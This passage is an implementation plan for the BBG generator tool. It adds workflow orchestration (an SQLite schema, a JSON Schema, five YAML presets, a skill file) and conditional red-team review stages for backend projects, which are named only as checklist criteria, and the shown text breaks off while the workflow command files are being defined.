# Runtime Orchestration & Red Team Testing Implementation Plan (Phase 6)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add runtime workflow orchestration (state machine with presets, SQLite tracking, 5 presets) and conditional backend red team testing (2-round protocol, attack taxonomy, OWASP-based playbook) as generated governance content deployed via `bbg init`.

**Architecture:** BBG is a generator. All new files are governance content that BBG copies to target projects via `bbg init`. The only `src/` changes are: (1) registering new templates in the governance manifest (`src/templates/governance.ts`) — adding workflow files to core manifest and red team files to a new `BACKEND_GOVERNANCE` conditional section, (2) adding an `isBackendProject()` helper that checks `ctx.hasJava || ctx.hasGo || ctx.hasRust || (ctx.hasPython && hasWebFramework)`, (3) updating test count assertions. Workflow presets are always deployed; red team assets (skill, command, SQL, playbook, report template) are conditionally deployed only for backend projects. The two existing stub files (`backend-red-team-playbook.md` and `red-team-report-TEMPLATE.md`) are moved from `ROOT_TEMPLATE_MANIFEST` (always deployed) to the conditional backend section and replaced with full content.

**Tech Stack:** TypeScript (ESM), vitest, SQLite DDL, YAML workflow presets, JSON Schema, Markdown governance content

---

## File Map

| Action  | File                                                             | Responsibility                                       |
| ------- | ---------------------------------------------------------------- | ---------------------------------------------------- |
| Create  | `templates/generic/.bbg/scripts/workflow-schema.sql`             | DDL for 2 tables + 2 views (workflow tracking)       |
| Create  | `templates/generic/workflows/schema.json`                        | JSON Schema for workflow definition format           |
| Create  | `templates/generic/workflows/presets/tdd-feature.yaml`           | TDD feature workflow (6 steps, 8 for backend)        |
| Create  | `templates/generic/workflows/presets/bugfix.yaml`                | Bugfix workflow (5 steps, no red team)               |
| Create  | `templates/generic/workflows/presets/security-audit.yaml`        | Security audit workflow (4 steps, 6 for backend)     |
| Create  | `templates/generic/workflows/presets/release-prep.yaml`          | Release preparation (5 steps, 7 for backend)         |
| Create  | `templates/generic/workflows/presets/full-feature.yaml`          | Full feature with interview (7 steps, 9 for backend) |
| Create  | `skills/workflow-orchestration/SKILL.md`                         | Orchestration skill with state machine docs          |
| Create  | `commands/workflow-start.md`                                     | Start a workflow command                             |
| Create  | `commands/workflow-resume.md`                                    | Resume a paused workflow command                     |
| Create  | `commands/workflow-status.md`                                    | Check workflow status command                        |
| Create  | `templates/generic/.bbg/scripts/red-team-schema.sql`             | DDL for 3 tables + 2 views (red team tracking)       |
| Create  | `skills/red-team-test/SKILL.md`                                  | Red team testing skill with 2-round protocol         |
| Create  | `commands/red-team.md`                                           | Red team test command                                |
| Replace | `templates/generic/docs/security/backend-red-team-playbook.md`   | Full attack handbook (replaces 3-line stub)          |
| Replace | `templates/generic/docs/reports/red-team-report-TEMPLATE.md`     | Full report template (replaces 3-line stub)          |
| Modify  | `src/templates/governance.ts:49-93,126-151,230-296,302-315`      | Register all new content, add backend conditional    |
| Modify  | `src/commands/init-manifest.ts:40-74`                            | Move playbook/report from ROOT to governance         |
| Modify  | `tests/unit/templates/governance.test.ts:58-101,135-136,183-184` | Update count assertions, add backend project tests   |

---

## Task 1: Create workflow-schema.sql

**Files:**

- Create: `templates/generic/.bbg/scripts/workflow-schema.sql`

- [ ] **Step 1: Create the directory structure**

Run: `mkdir -p templates/generic/.bbg/scripts`

(Directory may already exist from Phase 2. The command is idempotent.)

- [ ] **Step 2: Create workflow-schema.sql with 2 tables + 2 views**

Create `templates/generic/.bbg/scripts/workflow-schema.sql`:

```sql
-- =============================================================================
-- workflow-schema.sql — BBG Workflow Orchestration Schema
-- 2 tables + 2 views for tracking workflow execution, step progress, and
-- identifying bottlenecks.
-- Run: sqlite3 .bbg/telemetry.db < .bbg/scripts/workflow-schema.sql
-- =============================================================================

PRAGMA journal_mode = WAL;
PRAGMA foreign_keys = ON;

-- ---------------------------------------------------------------------------
-- Workflow instances — one row per workflow execution
-- ---------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS workflow_instances (
  id              INTEGER PRIMARY KEY AUTOINCREMENT,
  workflow_id     TEXT    NOT NULL UNIQUE,
  definition      TEXT    NOT NULL,
  task_id         TEXT,
  started_at      TEXT    NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
  completed_at    TEXT,
  status          TEXT    NOT NULL DEFAULT 'pending',
  current_step    TEXT,
  session_id      TEXT,
  total_steps     INTEGER,
  completed_steps INTEGER DEFAULT 0,
  total_duration_ms INTEGER
);

-- ---------------------------------------------------------------------------
-- Workflow steps — one row per step execution within a workflow
-- ---------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS workflow_steps (
  id              INTEGER PRIMARY KEY AUTOINCREMENT,
  workflow_id     TEXT    NOT NULL REFERENCES workflow_instances(workflow_id),
  step_id         TEXT    NOT NULL,
  agent           TEXT,
  status          TEXT    NOT NULL DEFAULT 'pending',
  started_at      TEXT,
  completed_at    TEXT,
  duration_ms     INTEGER,
  retries         INTEGER DEFAULT 0,
  failure_reason  TEXT,
  outputs         TEXT    -- JSON blob for step outputs
);

-- ---------------------------------------------------------------------------
-- Indexes
-- ---------------------------------------------------------------------------

CREATE INDEX IF NOT EXISTS idx_wi_status      ON workflow_instances(status);
CREATE INDEX IF NOT EXISTS idx_wi_definition  ON workflow_instances(definition);
CREATE INDEX IF NOT EXISTS idx_wi_session     ON workflow_instances(session_id);
CREATE INDEX IF NOT EXISTS idx_ws_workflow    ON workflow_steps(workflow_id);
CREATE INDEX IF NOT EXISTS idx_ws_status      ON workflow_steps(status);
CREATE INDEX IF NOT EXISTS idx_ws_agent       ON workflow_steps(agent);

-- ---------------------------------------------------------------------------
-- Views
-- ---------------------------------------------------------------------------

-- v_workflow_efficiency — completion rate and average duration per workflow type
CREATE VIEW IF NOT EXISTS v_workflow_efficiency AS
SELECT
  wi.definition,
  COUNT(*)                                                          AS total_runs,
  SUM(CASE WHEN wi.status = 'completed' THEN 1 ELSE 0 END)        AS completed,
  ROUND(
    100.0 * SUM(CASE WHEN wi.status = 'completed' THEN 1 ELSE 0 END)
    / COUNT(*), 1
  )                                                                 AS completion_rate,
  AVG(wi.total_duration_ms)                                         AS avg_duration_ms
FROM workflow_instances wi
GROUP BY wi.definition;

-- v_step_bottlenecks — identify slow or failure-prone steps
CREATE VIEW IF NOT EXISTS v_step_bottlenecks AS
SELECT
  wi.definition,
  ws.step_id,
  ws.agent,
  COUNT(*)              AS executions,
  AVG(ws.duration_ms)   AS avg_duration_ms,
  SUM(ws.retries)       AS total_retries
FROM workflow_steps ws
JOIN workflow_instances wi ON ws.workflow_id = wi.workflow_id
GROUP BY wi.definition, ws.step_id, ws.agent
ORDER BY avg_duration_ms DESC;
```

- [ ] **Step 3: Verify the file exists and is well-formed**

Run: `wc -l templates/generic/.bbg/scripts/workflow-schema.sql`
Expected: ~90 lines

- [ ] **Step 4: Commit**

```bash
git add templates/generic/.bbg/scripts/workflow-schema.sql
git commit -m "feat: add workflow orchestration SQL schema (2 tables + 2 views)"
```

---

## Task 2: Create workflow schema.json

**Files:**

- Create: `templates/generic/workflows/schema.json`

- [ ] **Step 1: Create the directory structure**

Run: `mkdir -p templates/generic/workflows/presets`

- [ ] **Step 2: Create schema.json defining the workflow definition format**

Create `templates/generic/workflows/schema.json`:

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://bbg.dev/schemas/workflow-definition.json",
  "title": "BBG Workflow Definition",
  "description": "Schema for BBG runtime workflow preset files. Each workflow defines a sequence of agent-driven steps with retry, timeout, and dependency configuration.",
  "type": "object",
  "required": ["name", "title", "version", "config", "steps"],
  "additionalProperties": false,
  "properties": {
    "name": {
      "type": "string",
      "pattern": "^[a-z][a-z0-9-]*$",
      "description": "Unique workflow identifier, lowercase with hyphens."
    },
    "title": {
      "type": "string",
      "description": "Human-readable workflow title."
    },
    "version": {
      "type": "string",
      "pattern": "^\\d+\\.\\d+$",
      "description": "Semantic version of the workflow definition."
    },
    "description": {
      "type": "string",
      "description": "Optional long description of the workflow purpose."
    },
    "config": {
      "type": "object",
      "required": ["max_retries", "retry_delay_ms", "timeout_ms", "allow_skip"],
      "additionalProperties": false,
      "properties": {
        "max_retries": {
          "type": "integer",
          "minimum": 0,
          "maximum": 5,
          "description": "Maximum retry attempts per step."
        },
        "retry_delay_ms": {
          "type": "integer",
          "minimum": 0,
          "description": "Delay in milliseconds between retries."
        },
        "timeout_ms": {
          "type": "integer",
          "minimum": 60000,
          "description": "Maximum wall-clock time for entire workflow."
        },
        "allow_skip": {
          "type": "boolean",
          "description": "Whether steps can be manually skipped."
        }
      }
    },
    "steps": {
      "type": "array",
      "minItems": 1,
      "items": {
        "type": "object",
        "required": ["id", "title", "agent", "command", "success_criteria"],
        "additionalProperties": false,
        "properties": {
          "id": {
            "type": "string",
            "pattern": "^[a-z][a-z0-9-]*$",
            "description": "Unique step identifier within the workflow."
          },
          "title": {
            "type": "string",
            "description": "Human-readable step title."
          },
          "agent": {
            "type": "string",
            "description": "Agent to execute this step (e.g. planner, tdd-guide)."
          },
          "command": {
            "type": "string",
            "description": "Slash command to invoke for this step."
          },
          "depends_on": {
            "type": "array",
            "items": { "type": "string" },
            "description": "Step IDs that must complete before this step runs."
          },
          "outputs": {
            "type": "array",
            "items": { "type": "string" },
            "description": "Named outputs produced by this step."
          },
          "inputs": {
            "type": "array",
            "items": { "type": "string" },
            "description": "Named inputs consumed from previous steps."
          },
          "success_criteria": {
            "type": "array",
            "items": { "type": "string" },
            "minItems": 1,
            "description": "Human-readable criteria for step completion."
          },
          "condition": {
            "type": "string",
            "description": "Runtime condition for including this step (e.g. 'backend_project'). Evaluated by the AI tool."
          }
        }
      }
    }
  }
}
```

- [ ] **Step 3: Verify the file is valid JSON**

Run: `node -e "JSON.parse(require('fs').readFileSync('templates/generic/workflows/schema.json','utf8')); console.log('valid')"`
Expected: `valid`

- [ ] **Step 4: Commit**

```bash
git add templates/generic/workflows/schema.json
git commit -m "feat: add JSON Schema for workflow definition format"
```

---

## Task 3: Create tdd-feature.yaml preset

**Files:**

- Create: `templates/generic/workflows/presets/tdd-feature.yaml`

- [ ] **Step 1: Create the TDD feature workflow preset**

Create `templates/generic/workflows/presets/tdd-feature.yaml`:

```yaml
# yaml-language-server: $schema=../schema.json
# TDD Feature Workflow — 6 steps (8 for backend projects with red team)
name: tdd-feature
title: "TDD Feature Development"
version: "1.0"
description: >
  Complete TDD feature development cycle: plan, write tests, implement,
  verify, review, and commit. Backend projects get 2 additional red-team
  steps injected between review and commit.

config:
  max_retries: 2
  retry_delay_ms: 5000
  timeout_ms: 3600000
  allow_skip: false

steps:
  - id: plan
    title: "Requirements Analysis & Planning"
    agent: planner
    command: plan
    outputs:
      - plan_path
    success_criteria:
      - "Implementation plan file created"
      - "All requirements mapped to tasks"
      - "Dependencies identified"

  - id: write-test
    title: "Write Failing Tests (RED)"
    agent: tdd-guide
    command: tdd
    depends_on:
      - plan
    inputs:
      - plan_path
    outputs:
      - test_files
    success_criteria:
      - "Test files created with failing tests"
      - "Tests exercise all acceptance criteria from plan"
      - "Test run confirms RED (failures)"

  - id: implement
    title: "Minimal Implementation (GREEN)"
    agent: tdd-guide
    command: tdd
    depends_on:
      - write-test
    inputs:
      - plan_path
      - test_files
    outputs:
      - impl_files
    success_criteria:
      - "All tests pass (GREEN)"
      - "Build succeeds"
      - "No lint errors"

  - id: refactor
    title: "Refactor & Improve"
    agent: code-reviewer
    command: code-review
    depends_on:
      - implement
    inputs:
      - impl_files
      - test_files
    outputs:
      - review_findings
    success_criteria:
      - "Code review completed"
      - "Refactoring suggestions applied"
      - "All tests still pass after refactoring"

  - id: security-review
    title: "Security Review"
    agent: security-reviewer
    command: security-scan
    depends_on:
      - refactor
    inputs:
      - impl_files
    outputs:
      - security_findings
    success_criteria:
      - "No critical or high severity findings"
      - "All inputs validated"
      - "No hardcoded secrets"

  # --- Backend-only steps (condition: backend_project) ---

  - id: red-team-sweep
    title: "Red Team Round 1 — Systematic Sweep"
    agent: security-reviewer
    command: red-team
    depends_on:
      - security-review
    inputs:
      - impl_files
      - security_findings
    outputs:
      - red_team_r1_report
    success_criteria:
      - "All 6 attack domains checked"
      - "Every endpoint tested against taxonomy"
      - "Findings documented with severity scores"
    condition: "backend_project"

  - id: red-team-creative
    title: "Red Team Round 2 — Adversarial Creative Attack"
    agent: security-reviewer
    command: red-team
    depends_on:
      - red-team-sweep
    inputs:
      - red_team_r1_report
      - impl_files
    outputs:
      - red_team_r2_report
    success_criteria:
      - "Attack chains explored"
      - "Timing and boundary attacks attempted"
      - "No critical findings remain open"
    condition: "backend_project"

  # --- End backend-only steps ---

  - id: commit
    title: "Final Verification & Commit"
    agent: tdd-guide
    command: verify
    depends_on:
      - security-review
      # Backend projects also depend on red-team-creative, evaluated at runtime
    outputs:
      - commit_sha
    success_criteria:
      - "All tests pass"
      - "Build succeeds"
      - "Lint clean"
      - "Changes committed with conventional commit message"
```

- [ ] **Step 2: Verify YAML syntax**

Run: `node -e "const yaml = require('yaml'); yaml.parse(require('fs').readFileSync('templates/generic/workflows/presets/tdd-feature.yaml','utf8')); console.log('valid')"`
Expected: `valid`

(If `yaml` package is not installed, just verify no syntax errors by reading the file.)

- [ ] **Step 3: Commit**

```bash
git add templates/generic/workflows/presets/tdd-feature.yaml
git commit -m "feat: add tdd-feature workflow preset (6 steps, 8 for backend)"
```

---

## Task 4: Create bugfix.yaml preset

**Files:**

- Create: `templates/generic/workflows/presets/bugfix.yaml`

- [ ] **Step 1: Create the bugfix workflow preset**

Create `templates/generic/workflows/presets/bugfix.yaml`:

```yaml
# yaml-language-server: $schema=../schema.json
# Bugfix Workflow — 5 steps (NO red team steps, stays at 5 for all projects)
name: bugfix
title: "Bugfix Workflow"
version: "1.0"
description: >
  Systematic bugfix cycle: reproduce, diagnose, fix with TDD, verify,
  and commit. No red team steps — bugfixes are scoped changes that go
  through standard security review only.

config:
  max_retries: 2
  retry_delay_ms: 5000
  timeout_ms: 1800000
  allow_skip: false

steps:
  - id: reproduce
    title: "Reproduce the Bug"
    agent: tdd-guide
    command: tdd
    outputs:
      - repro_test
      - bug_analysis
    success_criteria:
      - "Failing test that reproduces the bug"
      - "Root cause identified and documented"
      - "Reproduction is deterministic"

  - id: fix
    title: "Implement Fix (GREEN)"
    agent: tdd-guide
    command: tdd
    depends_on:
      - reproduce
    inputs:
      - repro_test
      - bug_analysis
    outputs:
      - fix_files
    success_criteria:
      - "Reproduction test now passes"
      - "No existing tests broken"
      - "Fix is minimal and focused"

  - id: regression-test
    title: "Add Regression Tests"
    agent: tdd-guide
    command: tdd
    depends_on:
      - fix
    inputs:
      - fix_files
      - bug_analysis
    outputs:
      - regression_tests
    success_criteria:
      - "Additional edge-case tests added"
      - "Tests cover the root cause, not just the symptom"
      - "All tests pass"

  - id: review
    title: "Code Review"
    agent: code-reviewer
    command: code-review
    depends_on:
      - regression-test
    inputs:
      - fix_files
      - regression_tests
    outputs:
      - review_findings
    success_criteria:
      - "Code review completed"
      - "No regressions introduced"
      - "Fix does not introduce new technical debt"

  - id: commit
    title: "Final Verification & Commit"
    agent: tdd-guide
    command: verify
    depends_on:
      - review
    outputs:
      - commit_sha
    success_criteria:
      - "All tests pass"
      - "Build succeeds"
      - "Lint clean"
      - "Changes committed with conventional commit message"
```

- [ ] **Step 2: Commit**

```bash
git add templates/generic/workflows/presets/bugfix.yaml
git commit -m "feat: add bugfix workflow preset (5 steps, no red team)"
```

---

## Task 5: Create security-audit.yaml preset

**Files:**

- Create: `templates/generic/workflows/presets/security-audit.yaml`

- [ ] **Step 1: Create the security audit workflow preset**

Create `templates/generic/workflows/presets/security-audit.yaml`:

```yaml
# yaml-language-server: $schema=../schema.json
# Security Audit Workflow — 4 steps (6 for backend projects with red team)
name: security-audit
title: "Security Audit"
version: "1.0"
description: >
  Comprehensive security audit: dependency scan, static analysis, code
  review for vulnerabilities, and remediation tracking. Backend projects
  get 2 additional red-team penetration testing steps.

config:
  max_retries: 1
  retry_delay_ms: 10000
  timeout_ms: 7200000
  allow_skip: false

steps:
  - id: dependency-scan
    title: "Dependency Vulnerability Scan"
    agent: security-reviewer
    command: security-scan
    outputs:
      - dep_findings
      - dep_report_path
    success_criteria:
      - "All dependencies scanned for known CVEs"
      - "Findings categorized by severity"
      - "Outdated dependencies flagged"

  - id: static-analysis
    title: "Static Security Analysis"
    agent: security-reviewer
    command: security-scan
    depends_on:
      - dependency-scan
    inputs:
      - dep_findings
    outputs:
      - static_findings
    success_criteria:
      - "Source code scanned for hardcoded secrets"
      - "SQL injection, XSS, path traversal checks completed"
      - "Input validation gaps identified"

  # --- Backend-only steps (condition: backend_project) ---

  - id: red-team-sweep
    title: "Red Team Round 1 — Systematic Sweep"
    agent: security-reviewer
    command: red-team
    depends_on:
      - static-analysis
    inputs:
      - static_findings
    outputs:
      - red_team_r1_report
    success_criteria:
      - "All 6 attack domains checked against every endpoint"
      - "22 attack categories evaluated"
      - "Findings scored with simplified CVSS"
    condition: "backend_project"

  - id: red-team-creative
    title: "Red Team Round 2 — Adversarial Creative Attack"
    agent: security-reviewer
    command: red-team
    depends_on:
      - red-team-sweep
    inputs:
      - red_team_r1_report
    outputs:
      - red_team_r2_report
    success_criteria:
      - "Multi-step attack chains attempted"
      - "Timing attacks and race conditions probed"
      - "Business logic abuse scenarios tested"
    condition: "backend_project"

  # --- End backend-only steps ---

  - id: remediation
    title: "Remediation Plan"
    agent: security-reviewer
    command: security-scan
    depends_on:
      - static-analysis
      # Backend projects also depend on red-team-creative, evaluated at runtime
    inputs:
      - dep_findings
      - static_findings
    outputs:
      - remediation_plan
    success_criteria:
      - "All critical and high findings have remediation steps"
      - "Fix priority order established"
      - "Remediation plan documented"

  - id: report
    title: "Security Audit Report"
    agent: security-reviewer
    command: security-scan
    depends_on:
      - remediation
    outputs:
      - audit_report_path
    success_criteria:
      - "Comprehensive audit report generated"
      - "Executive summary with risk rating"
      - "All findings tracked with status"
```

- [ ] **Step 2: Commit**

```bash
git add templates/generic/workflows/presets/security-audit.yaml
git commit -m "feat: add security-audit workflow preset (4 steps, 6 for backend)"
```

---

## Task 6: Create release-prep.yaml preset

**Files:**

- Create: `templates/generic/workflows/presets/release-prep.yaml`

- [ ] **Step 1: Create the release preparation workflow preset**

Create `templates/generic/workflows/presets/release-prep.yaml`:

```yaml
# yaml-language-server: $schema=../schema.json
# Release Preparation Workflow — 5 steps (7 for backend projects with red team)
name: release-prep
title: "Release Preparation"
version: "1.0"
description: >
  Complete release preparation cycle: version bump, changelog generation,
  full test suite, security sign-off, and release tag. Backend projects
  get 2 additional red-team steps before the final sign-off.

config:
  max_retries: 1
  retry_delay_ms: 10000
  timeout_ms: 7200000
  allow_skip: false

steps:
  - id: version-check
    title: "Version & Changelog"
    agent: planner
    command: plan
    outputs:
      - version_number
      - changelog_path
    success_criteria:
      - "Version number determined (semver)"
      - "Changelog generated from commits since last release"
      - "Breaking changes highlighted"

  - id: full-test
    title: "Full Test Suite"
    agent: tdd-guide
    command: verify
    depends_on:
      - version-check
    outputs:
      - test_report
    success_criteria:
      - "All unit tests pass"
      - "All integration tests pass"
      - "Test coverage meets threshold"

  - id: security-sign-off
    title: "Security Sign-off"
    agent: security-reviewer
    command: security-scan
    depends_on:
      - full-test
    outputs:
      - security_report
    success_criteria:
      - "No critical or high vulnerabilities"
      - "Dependency audit clean"
      - "Security review sign-off documented"

  # --- Backend-only steps (condition: backend_project) ---

  - id: red-team-sweep
    title: "Red Team Round 1 — Pre-Release Sweep"
    agent: security-reviewer
    command: red-team
    depends_on:
      - security-sign-off
    inputs:
      - security_report
    outputs:
      - red_team_r1_report
    success_criteria:
      - "All API endpoints tested against attack taxonomy"
      - "No critical findings"
      - "All high findings addressed or accepted with justification"
    condition: "backend_project"

  - id: red-team-creative
    title: "Red Team Round 2 — Pre-Release Adversarial"
    agent: security-reviewer
    command: red-team
    depends_on:
      - red-team-sweep
    inputs:
      - red_team_r1_report
    outputs:
      - red_team_r2_report
    success_criteria:
      - "Creative attack chains explored"
      - "No release-blocking findings"
      - "Risk acceptance documented for any open items"
    condition: "backend_project"

  # --- End backend-only steps ---

  - id: build-artifacts
    title: "Build Release Artifacts"
    agent: build-error-resolver
    command: build-fix
    depends_on:
      - security-sign-off
      # Backend projects also depend on red-team-creative, evaluated at runtime
    outputs:
      - artifact_paths
    success_criteria:
      - "Production build succeeds"
      - "Artifacts generated and verified"
      - "Build reproducibility confirmed"

  - id: tag-release
    title: "Tag & Release"
    agent: planner
    command: plan
    depends_on:
      - build-artifacts
    inputs:
      - version_number
      - changelog_path
      - artifact_paths
    outputs:
      - release_tag
    success_criteria:
      - "Git tag created with version number"
      - "Release notes published"
      - "Deployment checklist completed"
```

- [ ] **Step 2: Commit**

```bash
git add templates/generic/workflows/presets/release-prep.yaml
git commit -m "feat: add release-prep workflow preset (5 steps, 7 for backend)"
```

---

## Task 7: Create full-feature.yaml preset

**Files:**

- Create: `templates/generic/workflows/presets/full-feature.yaml`

- [ ] **Step 1: Create the full feature workflow preset**

Create `templates/generic/workflows/presets/full-feature.yaml`:

```yaml
# yaml-language-server: $schema=../schema.json
# Full Feature Workflow — 7 steps (9 for backend projects with red team)
name: full-feature
title: "Full Feature with Interview"
version: "1.0"
description: >
  Complete feature development with Socratic interview, planning, TDD,
  security review, documentation, and commit. Backend projects get 2
  additional red-team steps. This is the most comprehensive workflow.

config:
  max_retries: 2
  retry_delay_ms: 5000
  timeout_ms: 7200000
  allow_skip: false

steps:
  - id: interview
    title: "Socratic Requirements Interview"
    agent: architect
    command: plan
    outputs:
      - requirements_doc
      - acceptance_criteria
    success_criteria:
      - "Requirements elicited through structured questioning"
      - "Acceptance criteria defined and agreed"
      - "Edge cases and constraints identified"

  - id: plan
    title: "Implementation Planning"
    agent: planner
    command: plan
    depends_on:
      - interview
    inputs:
      - requirements_doc
      - acceptance_criteria
    outputs:
      - plan_path
    success_criteria:
      - "Implementation plan created with task breakdown"
      - "Architecture decisions documented"
      - "Dependencies and risks identified"

  - id: tdd-cycle
    title: "TDD Implementation (RED-GREEN-IMPROVE)"
    agent: tdd-guide
    command: tdd
    depends_on:
      - plan
    inputs:
      - plan_path
    outputs:
      - impl_files
      - test_files
    success_criteria:
      - "Tests written first (RED)"
      - "Implementation makes tests pass (GREEN)"
      - "Code refactored for quality (IMPROVE)"
      - "All tests pass"

  - id: code-review
    title: "Code Review"
    agent: code-reviewer
    command: code-review
    depends_on:
      - tdd-cycle
    inputs:
      - impl_files
      - test_files
    outputs:
      - review_findings
    success_criteria:
      - "Code review completed"
      - "All critical findings addressed"
      - "Code quality meets standards"

  - id: security-review
    title: "Security Review"
    agent: security-reviewer
    command: security-scan
    depends_on:
      - code-review
    inputs:
      - impl_files
    outputs:
      - security_findings
    success_criteria:
      - "No critical or high severity findings"
      - "Input validation complete"
      - "No hardcoded secrets"

  # --- Backend-only steps (condition: backend_project) ---

  - id: red-team-sweep
    title: "Red Team Round 1 — Systematic Sweep"
    agent: security-reviewer
    command: red-team
    depends_on:
      - security-review
    inputs:
      - impl_files
      - security_findings
    outputs:
      - red_team_r1_report
    success_criteria:
      - "All endpoints tested against 6 attack domains"
      - "22 attack categories evaluated"
      - "Findings documented with CVSS scores"
    condition: "backend_project"

  - id: red-team-creative
    title: "Red Team Round 2 — Adversarial Creative Attack"
    agent: security-reviewer
    command: red-team
    depends_on:
      - red-team-sweep
    inputs:
      - red_team_r1_report
      - impl_files
    outputs:
      - red_team_r2_report
    success_criteria:
      - "Multi-step attack chains attempted"
      - "Timing and race condition probes completed"
      - "No critical findings remain unresolved"
    condition: "backend_project"

  # --- End backend-only steps ---

  - id: documentation
    title: "Update Documentation"
    agent: doc-updater
    command: update-docs
    depends_on:
      - security-review
      # Backend projects also depend on red-team-creative, evaluated at runtime
    inputs:
      - impl_files
      - plan_path
    outputs:
      - doc_files
    success_criteria:
      - "API documentation updated"
      - "Architecture docs reflect changes"
      - "README updated if needed"

  - id: commit
    title: "Final Verification & Commit"
    agent: tdd-guide
    command: verify
    depends_on:
      - documentation
    outputs:
      - commit_sha
    success_criteria:
      - "All tests pass"
      - "Build succeeds"
      - "Lint clean"
      - "Documentation complete"
      - "Changes committed with conventional commit message"
```

- [ ] **Step 2: Commit**

```bash
git add templates/generic/workflows/presets/full-feature.yaml
git commit -m "feat: add full-feature workflow preset (7 steps, 9 for backend)"
```

---

## Task 8: Create workflow-orchestration skill

**Files:**

- Create: `skills/workflow-orchestration/SKILL.md`

- [ ] **Step 1: Create the skill directory**

Run: `mkdir -p skills/workflow-orchestration`

- [ ] **Step 2: Create the workflow orchestration skill**

Create `skills/workflow-orchestration/SKILL.md`:

```markdown
---
name: workflow-orchestration
category: ai-workflow
description: Runtime workflow orchestration — state machine execution, step retry/resume, SQLite tracking, and preset management
---

# Workflow Orchestration

## Overview

Load this skill when executing multi-step AI workflows from preset definitions. Workflows coordinate multiple agents through a defined sequence of steps with state tracking, retry logic, and SQLite-based observability.

## State Machine

### Step States
```

pending → in_progress → completed
↓
failed → retrying → in_progress
↓
paused → in_progress (resume)
↓
aborted

```

### Workflow States
```

pending → in_progress → completed
↓
paused → in_progress (resume)
↓
aborted

```

### Transitions
- **pending → in_progress**: Step/workflow begins execution
- **in_progress → completed**: Success criteria met
- **in_progress → failed**: Step throws error or criteria not met
- **failed → retrying**: Retry count < max_retries
- **retrying → in_progress**: Retry attempt begins
- **failed → aborted**: Retry count >= max_retries
- **in_progress → paused**: User requests pause or timeout
- **paused → in_progress**: User resumes with `/workflow-resume`

## Execution Protocol

### Starting a Workflow
1. Load workflow definition from `workflows/presets/<name>.yaml`
2. Validate against `workflows/schema.json`
3. Evaluate step conditions (e.g. `backend_project`) — remove steps whose conditions are not met
4. Generate a unique `workflow_id` (format: `<name>-<timestamp>`)
5. Insert row into `workflow_instances` with status `pending`
6. Insert rows into `workflow_steps` for each active step with status `pending`
7. Set workflow status to `in_progress`, begin first step

### Executing a Step
1. Set step status to `in_progress`, record `started_at`
2. Verify all `depends_on` steps are `completed`
3. Collect `inputs` from completed step `outputs`
4. Invoke the designated `agent` with the designated `command`
5. Evaluate `success_criteria` — all must be satisfied
6. On success: set status to `completed`, record `completed_at` and `duration_ms`
7. On failure: increment `retries`, set status to `retrying` or `failed`
8. Update `workflow_instances.completed_steps` count

### Retry Logic
- Maximum retries per step: defined in `config.max_retries`
- Delay between retries: `config.retry_delay_ms`
- On retry: log failure reason, increment retry counter, re-attempt
- After max retries exhausted: set step to `failed`, set workflow to `paused`
- User must decide: fix and `/workflow-resume`, skip (if `allow_skip`), or abort

### Resuming a Workflow
1. Load workflow state from `workflow_instances` where status = `paused`
2. Find the failed/paused step
3. If user fixed the issue: retry the step
4. If user wants to skip: set step to `aborted`, advance to next step (only if `allow_skip: true`)
5. If user wants to abort: set workflow to `aborted`

### Conditional Steps
Steps with a `condition` field are evaluated at workflow start:
- `backend_project`: included only if the project has backend repos (Java, Go, Rust, or Python with Django/FastAPI/Flask)
- Steps whose condition is not met are removed from the execution plan
- Dependencies that reference removed steps are also removed

## SQLite Tracking

All workflow executions are recorded in `.bbg/telemetry.db`:
- Initialize schema: `sqlite3 .bbg/telemetry.db < .bbg/scripts/workflow-schema.sql`
- Query efficiency: `SELECT * FROM v_workflow_efficiency`
- Find bottlenecks: `SELECT * FROM v_step_bottlenecks LIMIT 10`

## Available Presets

| Preset            | Steps (frontend) | Steps (backend) | Red Team |
|-------------------|-------------------|-----------------|----------|
| `tdd-feature`     | 6                 | 8               | Yes      |
| `bugfix`          | 5                 | 5               | No       |
| `security-audit`  | 4                 | 6               | Yes      |
| `release-prep`    | 5                 | 7               | Yes      |
| `full-feature`    | 7                 | 9               | Yes      |

## Rules
- Always validate workflow YAML against schema before execution
- Never skip mandatory steps (only skip if `allow_skip: true`)
- Record all state transitions in SQLite
- Log failure reasons for every failed step
- Respect timeout — pause workflow if `timeout_ms` exceeded
- Conditional steps must be evaluated at start, not mid-execution

## Checklist
- [ ] Workflow loaded and validated against schema
- [ ] Conditions evaluated and inactive steps removed
- [ ] SQLite tracking initialized
- [ ] Each step verified against success criteria
- [ ] Failed steps retried up to max_retries
- [ ] Workflow state persisted after every transition
- [ ] Duration tracked for every step and overall workflow

## Related

- **Skills**: [autonomous-loops](../autonomous-loops/SKILL.md), [agent-orchestration](../agent-orchestration/SKILL.md)
- **Commands**: [/workflow-start](../../commands/workflow-start.md), [/workflow-resume](../../commands/workflow-resume.md), [/workflow-status](../../commands/workflow-status.md)
- **SQL**: [workflow-schema.sql](../../.bbg/scripts/workflow-schema.sql) (deployed to target project)
```

- [ ] **Step 3: Verify the file exists**

Run: `wc -l skills/workflow-orchestration/SKILL.md`
Expected: ~120-130 lines

- [ ] **Step 4: Commit**

```bash
git add skills/workflow-orchestration/SKILL.md
git commit -m "feat: add workflow-orchestration skill with state machine docs"
```

---

## Task 9: Create workflow command files

**Files:**

- Create: `commands/workflow-start.md`
- Create: `commands/workflow-resume.md`
- Create: `commands/workflow-status.md`

- [ ] **Step 1: Create workflow-start.md**

Create `commands/workflow-start.md`:

```markdown
# /workflow-start

## Description

Start a predefined workflow from available presets. Loads the workflow definition, evaluates conditions, initializes SQLite tracking, and begins sequential step execution.

## Usage
```

/workflow-start tdd-feature
/workflow-start bugfix
/workflow-start security-audit
/workflow-start release-prep
/workflow-start full-feature

```

## Process
1. **Load preset** — Read workflow YAML from `workflows/presets/<name>.yaml`
2. **Validate** — Check against `workflows/schema.json`
3. **Evaluate conditions** — Remove steps where `condition` is not met (e.g., red-team steps for non-backend projects)
4. **Initialize tracking** — Create `workflow_instances` and `workflow_steps` rows in SQLite
5. **Execute steps** — Run each step sequentially:
